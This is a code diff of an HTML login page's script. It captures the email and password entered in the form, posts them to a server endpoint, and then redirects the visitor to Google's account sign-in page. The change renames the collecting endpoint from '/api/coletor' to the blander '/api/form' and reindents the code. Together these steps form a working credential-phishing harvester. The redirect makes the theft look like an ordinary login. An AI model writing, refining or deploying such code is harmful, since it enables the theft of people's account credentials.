@@ -67,21 +67,20 @@
 </form>
 
 <script>
-document.getElementById("loginForm").addEventListener("submit", async function (e) {
-  e.preventDefault();
-  const email = e.target.email.value;
-  const senha = e.target.senha.value;
+  document.getElementById("loginForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const email = e.target.email.value;
+    const senha = e.target.senha.value;
 
-  await fetch("/api/coletor", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ email, senha })
+    await fetch("/api/form", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, senha })
+    });
+
+    window.location.href = "https://accounts.google.com/";
   });
-
-  window.location.href = "https://accounts.google.com/";
-});
 </script>
-
 
 </body>
 </html>
